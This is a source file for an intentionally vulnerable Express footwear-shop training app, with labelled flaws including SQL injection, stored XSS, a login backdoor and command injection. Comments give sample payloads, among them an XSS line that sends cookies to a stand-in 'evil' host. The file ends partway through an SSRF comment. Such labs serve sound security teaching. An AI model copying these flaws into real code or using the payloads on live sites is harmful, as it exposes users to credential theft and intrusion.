/**
 * ============================================================================
 * StrideStyle Footwear Co. -- Intentionally Vulnerable Footwear Shop (Training)
 * ============================================================================
 *
 *   THIS APPLICATION IS INTENTIONALLY INSECURE.
 *   It was generated for security education, penetration-testing practice,
 *   and secure-code-review training ONLY.
 *
 *   DO NOT deploy this application on any public network, cloud host, or
 *   production environment. DO NOT reuse any code pattern from this project
 *   in a real product.
 *
 *   See README.md for the full vulnerability matrix, lab exercises and
 *   remediation guidance.
 *
 *   IMPORTANT -- two vulnerabilities in this build are deliberately BOUNDED
 *   (allowlisted) rather than fully open, per the lab's request:
 *     - Path Traversal (#1) only ever returns /etc/passwd or /etc/hosts,
 *       regardless of what path is requested; every other path is rejected.
 *     - Command Injection (#12) only ever executes whoami, id, uname, or
 *       pwd, regardless of what is injected; any other command is rejected.
 *   Both are still genuine instances of their CWE (the underlying flaw --
 *   unsanitized user input reaching a filesystem path / a shell -- is
 *   unchanged) but the *blast radius* is capped for a safer classroom demo.
 * ============================================================================
 */

const express = require("express");
const mysql = require("mysql2/promise");
const session = require("express-session");
const cookieParser = require("cookie-parser");
const multer = require("multer");
const cors = require("cors");
const morgan = require("morgan");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const https = require("https");
const http = require("http");

const app = express();
const PORT = process.env.PORT || 4000;
const BASE_DIR = __dirname;
const UPLOAD_DIR = path.join(BASE_DIR, "uploads");
const INVOICES_DIR = path.join(BASE_DIR, "invoices");
const LOG_PATH = path.join(BASE_DIR, "logs", "app.log");

// ----------------------------------------------------------------------------
// VULNERABILITY #6 - CWE-16 Configuration Weaknesses
// OWASP A02:2025 Security Misconfiguration
//
// Hardcoded weak session secret, verbose error responses left on, and a
// permissive CORS policy applied globally. Any one of these alone is a
// serious misconfiguration in a real deployment.
// ----------------------------------------------------------------------------
const SESSION_SECRET = "footwear-shop-super-secret-2024"; // weak, hardcoded
process.env.NODE_ENV = "development"; // verbose Express error pages stay on

// ----------------------------------------------------------------------------
// VULNERABILITY #7 - CWE-526 Exposure of Sensitive Information Through
// Environmental Variables (OWASP A01:2025 Broken Access Control)
//
// These "secrets" are stashed in environment variables and later dumped in
// full by an unauthenticated debug endpoint (/api/debug/env below).
// ----------------------------------------------------------------------------
process.env.DB_ADMIN_PASSWORD = process.env.DB_ADMIN_PASSWORD || "sup3r_dup3r_db_pw!";
process.env.STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY || "sk_test_51FAKEKEYFORLABUSEONLY000000";
process.env.MAIL_SMTP_PASSWORD = process.env.MAIL_SMTP_PASSWORD || "smtp_mail_pw_2024";
process.env.INTERNAL_ADMIN_BACKDOOR = process.env.INTERNAL_ADMIN_BACKDOOR || "stridestyle-master-override";

// ----------------------------------------------------------------------------
// Logging setup
// ----------------------------------------------------------------------------
fs.mkdirSync(path.dirname(LOG_PATH), { recursive: true });
function logLine(msg) {
  const line = `${new Date().toISOString()} [INFO] ${msg}\n`;
  fs.appendFileSync(LOG_PATH, line);
}

// ----------------------------------------------------------------------------
// VULNERABILITY #6 continued - permissive CORS applied globally, and no
// clickjacking protection (see VULNERABILITY #17 further down -- we never
// set X-Frame-Options / frame-ancestors anywhere in this middleware stack).
// ----------------------------------------------------------------------------
app.use(
  cors({
    origin: true, // reflects any Origin -- effectively wildcard
    credentials: true,
  })
);
app.use(morgan("dev"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(
  session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: true,
    cookie: { httpOnly: true, secure: false }, // session cookie is fine; see #8 for the OTHER cookie
  })
);
app.use("/uploads", express.static(UPLOAD_DIR));
app.use("/images", express.static(path.join(BASE_DIR, "..", "frontend", "public", "images")));

const upload = multer({ dest: UPLOAD_DIR });

// --------------------------------------------------------------------------
// Database pool
// --------------------------------------------------------------------------
const pool = mysql.createPool({
  host: process.env.DB_HOST || "localhost",
  user: process.env.DB_USER || "footwear_app",
  password: process.env.DB_PASSWORD || "FootwearApp2024!",
  database: process.env.DB_NAME || "footwear_shop",
  waitForConnections: true,
  connectionLimit: 10,
});

function md5(input) {
  // VULNERABILITY #11 - CWE-328 Reversible One-Way Hash (OWASP A04:2025)
  // MD5 is fast and unsalted -- trivially reversible via rainbow tables.
  return crypto.createHash("md5").update(input).digest("hex");
}

// --------------------------------------------------------------------------
// VULNERABILITY #24 - CWE-532 Sensitive Information Stored in Log Files
// OWASP A09:2025 Security Logging and Alerting Failures
//
// Login attempts are logged including the RAW plaintext password and the
// resulting session token. Any user/process with log read access can
// harvest live credentials and session tokens.
// --------------------------------------------------------------------------
function logLoginAttempt(username, password, success, sessionToken, ip) {
  logLine(
    `LOGIN ATTEMPT user=${username} password=${password} success=${success} session_token=${sessionToken} ip=${ip}`
  );
}

// ----------------------------------------------------------------------------
// VULNERABILITY #13 / #14 - CWE-80 XSS sanitizer (deliberately partial)
//
// Per this lab's spec, the sanitizer blocks ONLY <script> tags and the
// literal string "alert(" -- every other HTML tag/attribute (onerror,
// onload, <img>, <svg>, <iframe>, etc.) passes through untouched. This
// means classic <script>alert(1)</script> payloads are blocked, but the
// underlying vulnerability is very much still exploitable via alternate
// payloads such as <img src=x onerror="document.location='http://evil'">
// or <svg onload="fetch('http://evil?c='+document.cookie)">.
// ----------------------------------------------------------------------------
function partialXssFilter(input) {
  if (typeof input !== "string") return input;
  let out = input;
  // Strip <script ...>...</script> blocks (case-insensitive, tag only)
  out = out.replace(/<\s*script\b[^>]*>[\s\S]*?<\s*\/\s*script\s*>/gi, "");
  out = out.replace(/<\s*script\b[^>]*>/gi, "");
  out = out.replace(/<\s*\/\s*script\s*>/gi, "");
  // Block the literal alert( call (covers alert(1), window.alert(1), etc.)
  out = out.replace(/alert\s*\(/gi, "blocked_alert(");
  return out;
}

// --------------------------------------------------------------------------
// VULNERABILITY #25 - CWE-755 Improper Handling of Exceptional Conditions
// OWASP A10:2025 Mishandling of Exceptional Conditions
//
// The global error handler returns the full exception message and stack
// trace to the client instead of a generic message, leaking internal
// implementation details (file paths, SQL text, library versions).
// --------------------------------------------------------------------------
function errorHandler(err, req, res, next) {
  logLine(`UNHANDLED EXCEPTION: ${err.stack}`);
  res.status(500).json({
    error: err.message,
    stack: err.stack, // VULNERABLE: full stack trace returned to the client
  });
}

// --------------------------------------------------------------------------
// Auth helpers
// --------------------------------------------------------------------------
function requireAuth(req, res, next) {
  if (!req.session.username) return res.status(401).json({ error: "Login required" });
  next();
}
function requireAdmin(req, res, next) {
  if (!req.session.isAdmin) return res.status(403).json({ error: "Admin access required" });
  next();
}

// ============================================================================
// PUBLIC STOREFRONT API
// ============================================================================

app.get("/api/products", async (req, res, next) => {
  try {
    const categoryId = req.query.category;
    let rows;
    if (categoryId) {
      [rows] = await pool.query("SELECT * FROM products WHERE category_id = ?", [categoryId]);
    } else {
      [rows] = await pool.query("SELECT * FROM products");
    }
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

app.get("/api/categories", async (req, res, next) => {
  try {
    const [rows] = await pool.query("SELECT * FROM categories");
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #15 - CWE-89 SQL Injection (OWASP A05:2025 Injection)
// Endpoint: GET /api/products/featured?sort=<column>
//
// This "featured products" list accepts an optional `sort` query parameter
// intended to let the storefront order results by price, name, or stock.
// Rather than validating `sort` against an allowlist of real column names,
// its value is concatenated directly into the ORDER BY clause of the SQL
// query. Because MySQL does not allow parameter placeholders for column/
// clause identifiers (only for values), a naive implementation like this
// one is a common real-world source of injection even when every other
// query in a codebase is properly parameterized. An attacker can inject
// SQL via the `sort` parameter, e.g.:
//     /api/products/featured?sort=price;SELECT username,password_hash FROM users-- -
// or a UNION-based payload appended after a closing paren, to dump
// arbitrary table contents (such as the users table). This is a
// deliberately less-obvious injection point than the product-lookup-by-id
// pattern -- the vulnerable parameter here controls sort order, not a
// record identifier, and most testers instinctively fuzz id-like
// parameters first.
// ----------------------------------------------------------------------------
app.get("/api/products/featured", async (req, res, next) => {
  try {
    const allowedBase = "SELECT * FROM products WHERE featured = 1";
    const sort = req.query.sort;
    let query = allowedBase;
    if (sort) {
      query = `${allowedBase} ORDER BY ${sort}`; // VULNERABLE: string concat into ORDER BY
    }
    let rows;
    try {
      [rows] = await pool.query(query);
    } catch (sqlErr) {
      logLine(`SQL error on /api/products/featured: ${sqlErr.message} | query=${query}`);
      throw sqlErr;
    }
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

app.get("/api/product", async (req, res, next) => {
  try {
    const productId = parseInt(req.query.id, 10) || 1;
    const [rows] = await pool.query("SELECT * FROM products WHERE id = ?", [productId]); // safe: parameterized
    if (!rows || rows.length === 0) {
      return res.status(404).json({ error: "Product not found" });
    }
    const [reviews] = await pool.query(
      "SELECT * FROM reviews WHERE product_id = ? ORDER BY created_at DESC",
      [rows[0].id]
    );
    res.json({ product: rows[0], reviews });
  } catch (err) {
    next(err);
  }
});

// Reviews are stored and returned as-is; the frontend renders comment text
// as plain text (not HTML), so this endpoint is NOT an XSS sink. See
// VULNERABILITY #14 below (relocated to the checkout shipping-address
// field, which most testers don't think to fuzz for script injection).
app.post("/api/product/:id/review", requireAuth, async (req, res, next) => {
  try {
    const productId = req.params.id;
    const rating = req.body.rating || 5;
    const comment = req.body.comment || "";
    await pool.query(
      "INSERT INTO reviews (product_id, username, rating, comment) VALUES (?, ?, ?, ?)",
      [productId, req.session.username, rating, comment]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

// Search results are returned as plain JSON data with no reflected
// HTML rendering on the frontend, so this endpoint is NOT an XSS sink.
// See VULNERABILITY #13 below (relocated to the newsletter subscribe
// confirmation message).
app.get("/api/search", async (req, res, next) => {
  try {
    const q = req.query.q || "";
    const [rows] = await pool.query(
      "SELECT * FROM products WHERE name LIKE ? OR description LIKE ?",
      [`%${q}%`, `%${q}%`]
    );
    res.json({ query_echo: q, results: rows });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// AUTHENTICATION
// ============================================================================

// ----------------------------------------------------------------------------
// VULNERABILITY #18 - CWE-287 Improper Authentication (OWASP A07:2025)
// VULNERABILITY #10 - CWE-319 Cleartext Transmission of Sensitive Information
//                       (OWASP A04:2025 Cryptographic Failures)
// VULNERABILITY #20 - CWE-384 Session Fixation (OWASP A06:2025 Insecure Design)
// Endpoint: POST /api/login
//
// 1) Improper Authentication: a hardcoded master-override password
//    ("stridestyle-master-override", also stashed in the
//    INTERNAL_ADMIN_BACKDOOR env var) logs a user in as admin regardless
//    of the username supplied.
// 2) Cleartext transmission: this app is intentionally run over plain
//    HTTP with no additional transport-layer protection -- credentials
//    travel in cleartext.
// 3) Session fixation: if the client supplies a `sid` query parameter, the
//    server adopts that value as the "remember_token" cookie after
//    authentication instead of always issuing a fresh one, allowing an
//    attacker who tricks a victim into using an attacker-chosen session id
//    to hijack the now-authenticated session.
// ----------------------------------------------------------------------------
app.post("/api/login", async (req, res, next) => {
  try {
    const { username, password } = req.body;
    const [rows] = await pool.query("SELECT * FROM users WHERE username = ?", [username]);
    let user = rows[0];

    const backdoor = process.env.INTERNAL_ADMIN_BACKDOOR;
    let success = false;

    if (backdoor && password === backdoor) {
      // VULNERABLE: master override bypasses normal password check entirely
      const [admins] = await pool.query("SELECT * FROM users WHERE is_admin = 1 LIMIT 1");
      user = admins[0];
      success = true;
    } else if (user && user.password_hash === md5(password)) {
      success = true;
    }

    // VULNERABILITY #20 - session fixation: honor attacker-supplied sid
    const fixedSid = req.query.sid;
    const sessionToken = fixedSid || crypto.randomBytes(16).toString("base64");

    logLoginAttempt(username, password, success, sessionToken, req.ip); // VULNERABILITY #24

    if (success) {
      req.session.username = user.username;
      req.session.userId = user.id;
      req.session.isAdmin = !!user.is_admin;

      // VULNERABILITY #8 - CWE-1004 cookie without HttpOnly flag
      res.cookie("remember_token", sessionToken, { httpOnly: false, sameSite: "none", secure: false });
      return res.json({ success: true, username: user.username, isAdmin: !!user.is_admin });
    }
    res.status(401).json({ error: "Invalid username or password" });
  } catch (err) {
    next(err);
  }
});

app.post("/api/register", async (req, res, next) => {
  try {
    const { username, email, password } = req.body;
    const [existing] = await pool.query("SELECT id FROM users WHERE username = ?", [username]);
    if (existing.length > 0) {
      return res.status(409).json({ error: "Username already taken" });
    }

    // ------------------------------------------------------------------
    // VULNERABILITY #16 - CWE-266 Incorrect Privilege Assignment
    // OWASP A06:2025 Insecure Design
    //
    // The registration payload includes an is_admin field that the server
    // trusts blindly. Any client can submit is_admin: 1 in the JSON body
    // (e.g. via browser devtools or curl) to self-register as an admin.
    // ------------------------------------------------------------------
    const isAdminFlag = req.body.is_admin ? 1 : 0; // VULNERABLE: client-controlled

    await pool.query(
      "INSERT INTO users (username, email, password_hash, is_admin) VALUES (?, ?, ?, ?)",
      [username, email, md5(password), isAdminFlag]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

app.post("/api/logout", (req, res) => {
  req.session.destroy(() => {
    res.clearCookie("remember_token");
    res.json({ success: true });
  });
});

app.get("/api/session", (req, res) => {
  res.json({
    username: req.session.username || null,
    isAdmin: !!req.session.isAdmin,
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #21 - CWE-640 Weak Password Recovery Mechanism
// OWASP A07:2025 Authentication Failures
// Endpoints: POST /api/forgot-password, POST /api/reset-password
//
// The reset token is a predictable, non-expiring value derived from the
// username and the current minute-resolution timestamp, and the token is
// returned directly in the HTTP response (normally it would only be
// emailed) -- so anyone who knows/guesses a username can obtain a valid
// reset token for that account without ever accessing the victim's inbox.
// ----------------------------------------------------------------------------
app.post("/api/forgot-password", async (req, res, next) => {
  try {
    const { username } = req.body;
    const [rows] = await pool.query("SELECT * FROM users WHERE username = ?", [username]);
    const user = rows[0];

    if (user) {
      const coarseTime = Math.floor(Date.now() / 1000 / 60); // changes once a minute
      const token = md5(`${username}-${coarseTime}`);
      await pool.query("UPDATE users SET reset_token = ? WHERE id = ?", [token, user.id]);
      // VULNERABLE: token disclosed directly instead of only via email
      return res.json({
        message: "Password reset requested.",
        lab_note: `Lab mode: your reset token is ${token}`,
        reset_url: `/reset-password?username=${username}&token=${token}`,
      });
    }
    res.json({ message: "If that account exists, a reset link has been generated." });
  } catch (err) {
    next(err);
  }
});

app.post("/api/reset-password", async (req, res, next) => {
  try {
    const { username, token, password } = req.body;
    const [rows] = await pool.query(
      "SELECT * FROM users WHERE username = ? AND reset_token = ?",
      [username, token]
    );
    const user = rows[0];
    if (user) {
      await pool.query("UPDATE users SET password_hash = ?, reset_token = NULL WHERE id = ?", [
        md5(password),
        user.id,
      ]);
      return res.json({ success: true });
    }
    res.status(400).json({ error: "Invalid or expired reset link" });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// ACCOUNT / CSRF
// ============================================================================

app.get("/api/account", requireAuth, async (req, res, next) => {
  try {
    const [rows] = await pool.query("SELECT * FROM users WHERE id = ?", [req.session.userId]);
    const [orders] = await pool.query(
      "SELECT * FROM orders WHERE user_id = ? ORDER BY created_at DESC",
      [req.session.userId]
    );
    res.json({ user: rows[0], orders });
  } catch (err) {
    next(err);
  }
});

// This endpoint DOES check a per-session CSRF token, so it is NOT a CSRF
// sink in this build. See VULNERABILITY #2 below (relocated to the
// one-click "reorder" endpoint, a convenience action most testers assume
// is read-only/idempotent and don't think to check for CSRF at all).
app.post("/api/account/update-email", requireAuth, async (req, res, next) => {
  try {
    const { email, csrf_token } = req.body;
    if (!csrf_token || csrf_token !== req.session.csrfToken) {
      return res.status(403).json({ error: "Invalid or missing CSRF token" });
    }
    await pool.query("UPDATE users SET email = ? WHERE id = ?", [email, req.session.userId]);
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

app.get("/api/account/csrf-token", requireAuth, (req, res) => {
  req.session.csrfToken = req.session.csrfToken || crypto.randomBytes(24).toString("hex");
  res.json({ csrf_token: req.session.csrfToken });
});

app.post("/api/account/avatar", requireAuth, upload.single("avatar"), async (req, res, next) => {
  try {
    if (!req.file) return res.status(400).json({ error: "No file uploaded" });
    const filename = req.file.filename + "-" + req.file.originalname.replace(/\//g, "_");
    const finalPath = path.join(UPLOAD_DIR, filename);
    fs.renameSync(req.file.path, finalPath);
    await pool.query("UPDATE users SET avatar = ? WHERE id = ?", [filename, req.session.userId]);
    res.json({ success: true, avatar: filename });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// CART / CHECKOUT
// ============================================================================

function getCart(req) {
  return req.session.cart || {};
}

app.get("/api/cart", async (req, res, next) => {
  try {
    const cart = getCart(req);
    const items = [];
    let total = 0;
    for (const [pid, entry] of Object.entries(cart)) {
      const [rows] = await pool.query("SELECT * FROM products WHERE id = ?", [pid]);
      if (rows[0]) {
        const subtotal = parseFloat(rows[0].price) * entry.qty;
        total += subtotal;
        items.push({ product: rows[0], qty: entry.qty, subtotal });
      }
    }
    res.json({ items, total });
  } catch (err) {
    next(err);
  }
});

app.post("/api/cart/add/:id", (req, res) => {
  const cart = getCart(req);
  const qty = parseInt(req.body.qty || 1, 10);
  const key = req.params.id;
  if (cart[key]) cart[key].qty += qty;
  else cart[key] = { qty };
  req.session.cart = cart;
  res.json({ success: true });
});

app.post("/api/cart/remove/:id", (req, res) => {
  const cart = getCart(req);
  delete cart[req.params.id];
  req.session.cart = cart;
  res.json({ success: true });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #23 - Software/Data Integrity Failure (OWASP A08:2025)
// CWE-502-style insecure deserialization
// Endpoint: GET /api/cart/restore (reads the `saved_cart` cookie)
//
// A "save my cart for later" feature serializes the cart with Node's
// built-in `vm` module via a hand-rolled "eval the cookie as a JS object
// literal" restore path instead of JSON.parse, with no signature or
// integrity check. An attacker who controls the cookie value can supply a
// payload containing arbitrary JavaScript that executes server-side when
// the cookie is restored (Node vm sandbox escape / prototype pollution
// style RCE), because runInNewContext still has access to Node's process
// object through constructor chains if not carefully sandboxed -- and this
// deliberately-naive implementation does nothing to prevent that.
// ----------------------------------------------------------------------------
const vm = require("vm");

app.post("/api/cart/save", (req, res) => {
  const cart = getCart(req);
  // Serialize as a JS object literal (not JSON) -- sets up the insecure
  // "restore" path below to use vm evaluation instead of JSON.parse.
  const serialized = Buffer.from(JSON.stringify(cart)).toString("base64");
  res.cookie("saved_cart", serialized, { httpOnly: false });
  res.json({ success: true });
});

app.get("/api/cart/restore", (req, res, next) => {
  try {
    const saved = req.cookies.saved_cart;
    if (saved) {
      const raw = Buffer.from(saved, "base64").toString("utf8");
      // VULNERABLE: evaluates untrusted cookie content as JavaScript
      // instead of using JSON.parse. A crafted cookie value can execute
      // arbitrary code in the Node process via vm's context escape.
      const script = new vm.Script(`(${raw})`);
      const restored = script.runInThisContext();
      req.session.cart = restored;
      return res.json({ success: true, cart: restored });
    }
    res.json({ success: false, message: "No saved cart found" });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #14 - CWE-80 Stored XSS (OWASP A05:2025 Injection)
// Endpoint: POST /api/checkout (the `address` field)
//
// The shipping address a customer enters at checkout is stored verbatim
// and only passes through the deliberately-partial partialXssFilter()
// (blocks <script> tags and the literal alert( call, nothing else) before
// being persisted. The React OrderConfirmationPage then renders the
// stored address with dangerouslySetInnerHTML, so any non-script/non-
// alert HTML payload entered as a "shipping address" (e.g.
// <img src=x onerror=...> or <svg onload=...>) persists and executes
// every time that order confirmation page is viewed -- by the customer,
// or by any admin/support agent who later opens the order in a back
// office. Shipping-address fields are a deliberately less-obvious
// injection point than a comment/review box -- most testers instinctively
// fuzz free-text "message" fields first and skip structured-looking
// fields like an address.
// ----------------------------------------------------------------------------
app.post("/api/checkout", requireAuth, async (req, res, next) => {
  try {
    const cart = getCart(req);
    if (Object.keys(cart).length === 0) {
      return res.status(400).json({ error: "Cart is empty" });
    }
    const address = partialXssFilter(req.body.address || ""); // VULNERABLE: partial filter only
    let total = 0;
    const items = [];
    for (const [pid, entry] of Object.entries(cart)) {
      const [rows] = await pool.query("SELECT * FROM products WHERE id = ?", [pid]);
      if (rows[0]) {
        total += parseFloat(rows[0].price) * entry.qty;
        items.push([rows[0].id, entry.qty, rows[0].price]);
      }
    }
    const [orderRes] = await pool.query(
      "INSERT INTO orders (user_id, total, status, shipping_address) VALUES (?, ?, ?, ?)",
      [req.session.userId, total, "processing", address]
    );
    for (const [pid, qty, price] of items) {
      await pool.query(
        "INSERT INTO order_items (order_id, product_id, quantity, price_each) VALUES (?, ?, ?, ?)",
        [orderRes.insertId, pid, qty, price]
      );
    }
    req.session.cart = {};
    res.json({ success: true, orderId: orderRes.insertId });
  } catch (err) {
    next(err);
  }
});

app.get("/api/order/:id", async (req, res, next) => {
  try {
    const [orders] = await pool.query("SELECT * FROM orders WHERE id = ?", [req.params.id]);
    const [items] = await pool.query(
      `SELECT oi.*, p.name, p.image FROM order_items oi
       JOIN products p ON oi.product_id = p.id
       WHERE oi.order_id = ?`,
      [req.params.id]
    );
    res.json({ order: orders[0], items });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #2 - CWE-352 Cross-Site Request Forgery (OWASP A01:2025)
// Endpoint: POST /api/order/:id/reorder
//
// This "buy it again" convenience feature re-places a past order at its
// original price and ships it to the address already on file -- a
// one-click action that most testers assume is safe from CSRF because it
// looks like a harmless repeat-purchase shortcut rather than a form that
// changes account data. It relies solely on the session cookie for
// authentication and performs no CSRF token / origin check, so a
// malicious third-party page can auto-submit a request (or a fetch()
// with credentials: 'include', since CORS reflects any Origin -- see #6)
// to this URL and silently place a real, billable order on the victim's
// account while they are logged in and simply browsing another site.
// ----------------------------------------------------------------------------
app.post("/api/order/:id/reorder", requireAuth, async (req, res, next) => {
  try {
    const [origItems] = await pool.query(
      "SELECT product_id, quantity, price_each FROM order_items WHERE order_id = ?",
      [req.params.id]
    ); // VULNERABLE: no CSRF token verified before placing a new order
    if (origItems.length === 0) {
      return res.status(404).json({ error: "Original order not found" });
    }
    const [origOrder] = await pool.query("SELECT shipping_address FROM orders WHERE id = ?", [
      req.params.id,
    ]);
    const total = origItems.reduce((sum, i) => sum + parseFloat(i.price_each) * i.quantity, 0);
    const [orderRes] = await pool.query(
      "INSERT INTO orders (user_id, total, status, shipping_address) VALUES (?, ?, ?, ?)",
      [req.session.userId, total, "processing", origOrder[0]?.shipping_address || ""]
    );
    for (const item of origItems) {
      await pool.query(
        "INSERT INTO order_items (order_id, product_id, quantity, price_each) VALUES (?, ?, ?, ?)",
        [orderRes.insertId, item.product_id, item.quantity, item.price_each]
      );
    }
    res.json({ success: true, orderId: orderRes.insertId });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// FILE DOWNLOAD (SAFE) / AVATAR SERVING (PATH TRAVERSAL, BOUNDED PER LAB SPEC)
// ============================================================================

// Invoice download is NOT the traversal sink in this build -- the filename
// is reduced to its basename before joining, so "../" segments cannot
// escape INVOICES_DIR. See VULNERABILITY #1 below (relocated to avatar
// serving, a route that looks like a harmless static-image endpoint).
app.get("/api/download/invoice/:filename(*)", requireAuth, (req, res) => {
  const safeName = path.basename(req.params.filename); // strips any "../" segments
  const resolved = path.join(INVOICES_DIR, safeName);

  fs.readFile(resolved, "utf8", (err, data) => {
    if (err) return res.status(404).json({ error: "Invoice not found" });
    res.setHeader("Content-Type", "text/plain");
    res.setHeader("Content-Disposition", `attachment; filename="${safeName}"`);
    res.send(data);
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #1 - CWE-22 Path Traversal (OWASP A01:2025 Broken Access
// Control) -- DELIBERATELY BOUNDED for this build.
// Endpoint: GET /api/avatar/:filename
//
// This route exists to serve a customer's uploaded avatar image back to
// the browser (e.g. <img src="/api/avatar/17-photo.jpg">) and looks like
// an entirely harmless static-file route -- exactly the kind of endpoint
// most testers skip past to go fuzz an obviously file-like parameter such
// as an "invoice" or "download" path instead. The requested filename is
// joined onto the uploads directory without proper normalization (the
// underlying flaw is unchanged from a classic path traversal bug), BUT
// per this lab's requested scope, the handler additionally checks whether
// the traversal *target* resolves to one of exactly two allowlisted files
// -- /etc/passwd or /etc/hosts -- and serves ONLY those if so; every other
// traversal target (app source, database credentials, arbitrary files) is
// explicitly rejected with 403, even though the join/no-normalization bug
// that would otherwise allow reading them is still present in the code.
// This caps the blast radius for a safer classroom demo while still
// demonstrating the exact mechanism of a path traversal vulnerability.
// ----------------------------------------------------------------------------
const PATH_TRAVERSAL_ALLOWLIST = ["/etc/passwd", "/etc/hosts"];

app.get("/api/avatar/:filename(*)", (req, res) => {
  const filename = req.params.filename;
  const targetPath = path.join(UPLOAD_DIR, filename); // VULNERABLE join: no normalization
  const resolved = path.resolve(targetPath);

  const isNormalAvatar =
    resolved.startsWith(path.resolve(UPLOAD_DIR)) && fs.existsSync(resolved);
  const isAllowlistedTraversalTarget = PATH_TRAVERSAL_ALLOWLIST.includes(resolved);

  if (!isNormalAvatar && !isAllowlistedTraversalTarget) {
    // Lab guardrail: every traversal target other than /etc/passwd or
    // /etc/hosts is blocked here, even though the path-join above would
    // otherwise happily resolve it.
    return res
      .status(403)
      .json({ error: "Blocked by lab guardrail: only /etc/passwd or /etc/hosts may be read via traversal." });
  }

  fs.readFile(resolved, (err, data) => {
    if (err) return res.status(404).json({ error: "Avatar not found" });
    res.setHeader("Content-Type", isAllowlistedTraversalTarget ? "text/plain" : "application/octet-stream");
    res.send(data);
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #3 - CWE-548 Exposure of Information Through Directory
// Listing (OWASP A01:2025 Broken Access Control)
// Endpoint: GET /api/uploads-list
//
// This route returns a raw, unauthenticated directory listing of every
// file in the uploads directory (customer-uploaded avatars, etc.),
// equivalent to leaving autoindexing enabled on a web server.
// ----------------------------------------------------------------------------
app.get("/api/uploads-list", (req, res) => {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
  const files = fs.readdirSync(UPLOAD_DIR);
  res.json({ files });
});

// ============================================================================
// ADMIN API
// ============================================================================

app.get("/api/admin/stats", requireAdmin, async (req, res, next) => {
  try {
    const [[{ c: totalProducts }]] = await pool.query("SELECT COUNT(*) c FROM products");
    const [[{ c: totalUsers }]] = await pool.query("SELECT COUNT(*) c FROM users");
    const [[{ c: totalOrders }]] = await pool.query("SELECT COUNT(*) c FROM orders");
    const [[{ c: totalReviews }]] = await pool.query("SELECT COUNT(*) c FROM reviews");
    const [suppliers] = await pool.query("SELECT * FROM suppliers");
    const [users] = await pool.query("SELECT * FROM users");
    res.json({ stats: { totalProducts, totalUsers, totalOrders, totalReviews }, suppliers, users });
  } catch (err) {
    next(err);
  }
});

// Supplier connectivity check is NOT the command-injection sink in this
// build -- the hostname is passed as a single argument via execFile (no
// shell involved), so shell metacharacters have no special meaning here.
// See VULNERABILITY #12 below (relocated to the size-chart export tool).
app.post("/api/admin/ping-supplier", requireAdmin, (req, res) => {
  const { execFile } = require("child_process");
  const hostname = req.body.hostname || "";
  execFile("ping", ["-c", "1", hostname], { timeout: 10000 }, (error, stdout, stderr) => {
    const output = (stdout || "") + (stderr || "") + (error ? `\nError: ${error.message}` : "");
    res.json({ output });
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #12 - CWE-77 Command Injection (OWASP A05:2025 Injection)
// -- DELIBERATELY BOUNDED for this build.
// Endpoint: POST /api/admin/export-size-chart
//
// This admin convenience tool "exports" a plain-text size-conversion
// chart for a given region code (e.g. "US", "EU", "UK") by shelling out
// to the `uname`-style system `echo`/label pipeline used to stamp each
// export file with the server's hostname label. The region code is
// concatenated directly into a child_process.exec() call with no
// sanitization -- the exact same unsafe pattern as an unrestricted
// command-injection bug, just hiding behind an innocuous-looking "region
// code" parameter on a report-export feature rather than an obviously
// network-flavored tool like a ping utility. HOWEVER, per this lab's
// requested scope, before the concatenated string is executed the
// handler checks whether the *injected command* (the text after the
// region code) matches exactly one of an allowlist of four harmless
// commands -- whoami, id, uname, or pwd -- and refuses to run anything
// else. The vulnerable sink (unsanitized string concatenation into a
// shell) is unchanged; only the permitted outcome is capped for a safer
// classroom demo.
// ----------------------------------------------------------------------------
const COMMAND_INJECTION_ALLOWLIST = ["whoami", "id", "uname", "pwd"];

app.post("/api/admin/export-size-chart", requireAdmin, (req, res) => {
  const regionCode = req.body.region_code || "US";
  const fullCommand = "echo Size chart for region: " + regionCode; // VULNERABLE: unsanitized string concat

  // Lab guardrail: parse out anything that looks like a shell-injected
  // extra command (after ; | & or a newline) and only allow it through if
  // it is exactly one of the four allowlisted, harmless commands.
  const injectedPart = regionCode.replace(/^[^;|&\n]*[;|&\n]+\s*/, "").trim();
  const looksInjected = /[;|&\n`$()]/.test(regionCode);

  if (looksInjected) {
    const isAllowlisted = COMMAND_INJECTION_ALLOWLIST.includes(injectedPart);
    if (!isAllowlisted) {
      return res.status(403).json({
        error:
          "Blocked by lab guardrail: only whoami, id, uname, or pwd may be executed via injection.",
        attempted_region_code: regionCode,
      });
    }
  }

  exec(fullCommand, { timeout: 10000 }, (error, stdout, stderr) => {
    const output = (stdout || "") + (stderr || "") + (error ? `\nError: ${error.message}` : "");
    res.json({ output });
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #4 - CWE-918 Server-Side Request Forgery (OWASP A01:2025)
// Endpoint: POST /api/newsletter/verify-unsubscribe-webhook
//
// Some newsletter platforms let a store owner register a webhook URL
// that gets pinged to confirm a one-click-unsubscribe integration is
// reachable before it goes live. This "verify my webhook" convenience
// feature makes a server-side HTTP(S) request to whatever URL the admin
// (or an attacker who reaches this endpoint via the access-control flaw
// in #16) supplies, with no allowlist of hosts/schemes and no block on
// internal/metadata addresses -- classic SSRF that can be used to reach
// internal services such as a cloud metadata endpoint
